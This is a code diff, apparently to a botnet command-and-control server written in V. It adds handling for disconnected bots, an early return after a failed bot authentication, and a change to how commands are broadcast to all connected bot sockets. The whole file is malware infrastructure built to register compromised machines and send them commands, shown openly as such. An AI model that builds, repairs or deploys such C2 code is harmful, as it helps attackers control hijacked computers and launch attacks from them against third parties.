@@ -32,6 +32,20 @@ pub fn (mut b Bot_CNC) add_bot_session(nick string, mut s net.TcpConn, cpu strin
 	b.port << port
 }
 
+pub fn (mut b Bot_CNC) remove_bot(mut s net.TcpConn) {
+	for i, sock in b.socket {
+		if sock == s {
+			println("[ x ] Lost connection to: ${b.ip[i]}.....!")
+			b.nickname.delete(i)
+			b.socket.delete(i)
+			b.cpu.delete(i)
+			b.ip.delete(i)
+			b.port.delete(i)
+		}
+	}
+	s.close() or { return }
+}
+
 pub fn (mut b Bot_CNC) listener(port string, bot_pw string) {
 	mut socket := net.listen_tcp(.ip6, ":${port}") or {
 		println("[x] Error, Unable to start bot system.....!")
@@ -68,6 +82,7 @@ pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 	if cpu == "" {
 		println("[ + ] Bot CPU: ${cpu}")
 		bot_conn.close() or { return }
+		return
 	}
 
 	user_addy := bot_conn.peer_addr() or { return }
@@ -75,7 +90,11 @@ pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 	println("Bot [${user_ip}] successfully connected.....!")
 	b.add_bot_session(b.randomize_nick(), mut bot_conn, cpu, user_ip, "")
 	for {
-		data := reader.read_line() or { "" }
+		data := reader.read_line() or {
+			b.remove_bot(mut bot_conn)
+			return
+		}
+
 		if data.len > 3 {
 			println(data)
 		}
@@ -84,7 +103,7 @@ pub fn (mut b Bot_CNC) bot_auth(mut bot_conn net.TcpConn, bot_pw string) {
 
 pub fn (mut b Bot_CNC) broadcast_cmd(cmd string) int {
 	for i in 0..b.nickname.len {
-		b.socket[i].write_string(cmd + "\n") or { 0 }
+		b.socket[i].write_string("${cmd}\r\n") or { 0 }
 	}
 	return 1
 }
